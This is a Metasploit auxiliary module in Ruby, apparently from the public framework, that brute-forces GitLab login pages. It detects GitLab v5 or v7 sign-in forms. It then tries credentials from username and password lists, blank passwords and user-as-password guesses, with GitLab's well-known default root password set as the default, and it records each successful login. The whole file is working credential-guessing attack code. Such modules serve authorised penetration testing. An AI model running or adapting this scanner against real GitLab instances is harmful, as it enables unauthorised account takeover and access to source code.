##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/gitlab'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute

  def initialize
    super(
      'Name'        => 'GitLab Login Utility',
      'Description' => 'This module attempts to login to a GitLab instance using a specific user/pass.',
      'Author'      => [ 'Ben Campbell' ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          ['URL', 'https://labs.mwrinfosecurity.com/blog/2015/03/20/gitlab-user-enumeration/']
        ]
    )

    register_options(
      [
        Opt::RPORT(80),
        OptString.new('HttpUsername', [ true, 'The username to test', 'root' ]),
        OptString.new('HttpPassword', [ true, 'The password to test', '5iveL!fe' ]),
        OptString.new('TARGETURI', [true, 'The path to GitLab', '/'])
      ])

    register_autofilter_ports([ 80, 443 ])

    deregister_options('RHOST')
  end

  def run_host(ip)
    uri = normalize_uri(target_uri.path.to_s, 'users', 'sign_in')
    res = send_request_cgi(
                            'method' => 'GET',
                            'cookie' => 'request_method=GET',
                            'uri'    => uri
    )

    if res && res.body && res.body.include?('user[email]')
      vprint_status("GitLab v5 login page")
    elsif res && res.body && res.body.include?('user[login]')
      vprint_status("GitLab v7 login page")
    else
      vprint_error('Not a valid GitLab login page')
      return
    end

    cred_collection = Metasploit::Framework::CredentialCollection.new(
      blank_passwords: datastore['BLANK_PASSWORDS'],
      pass_file: datastore['PASS_FILE'],
      password: datastore['HttpPassword'],
      user_file: datastore['USER_FILE'],
      userpass_file: datastore['USERPASS_FILE'],
      username: datastore['HttpUsername'],
      user_as_pass: datastore['USER_AS_PASS']
    )

    scanner = Metasploit::Framework::LoginScanner::GitLab.new(
      configure_http_login_scanner(
        cred_details: cred_collection,
        stop_on_success: datastore['STOP_ON_SUCCESS'],
        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
        uri: uri,
        connection_timeout: 10
      )
    )

    scanner.scan! do |result|
      credential_data = result.to_h
      credential_data.merge!(
          module_fullname: fullname,
          workspace_id: myworkspace_id
      )
      if result.success?
        credential_core = create_credential(credential_data)
        credential_data[:core] = credential_core
        create_credential_login(credential_data)

        print_good "#{ip}:#{rport} - Login Successful: #{result.credential}"
      else
        invalidate_login(credential_data)
        vprint_error "#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status})"
      end
    end
  end
end
